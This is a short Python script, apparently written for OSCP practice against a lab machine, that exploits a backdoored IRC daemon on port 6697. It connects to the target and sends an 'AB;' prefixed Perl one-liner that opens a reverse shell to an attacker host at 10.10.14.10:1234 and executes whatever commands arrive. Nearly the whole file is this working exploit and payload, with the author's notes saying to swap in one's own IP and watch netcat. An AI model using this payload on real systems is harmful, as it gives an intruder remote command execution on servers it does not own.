import socket

#target ip and port
ip="10.10.10.117"
port=6697
##################
print ("MADE BY :- SARTHAK")
print("			Referenced by:- Metasploit source code")

print("NOTE:-I MADE THIS DUE TO PEOPLE PREPARING FOR OSCP WANT TO DO EXPLOITATION MANUALLY AS WELL AS THE EXPLOIT-DB EXPLOIT DOESN'T SEEM TO BE WORKING IDK WHY :(\n")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,port))

a=s.recv(1024)

print "Sending payload baby :)"

#replace the ip and port with yours ...(YOUR IP AND PORT)
a="AB;perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"10.10.14.10:1234\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"

s.sendall(a)
print("Eyes on netcat sire 10...9...8...7...6...5..4..3...2..1..HAHA IT WILL COME :)")
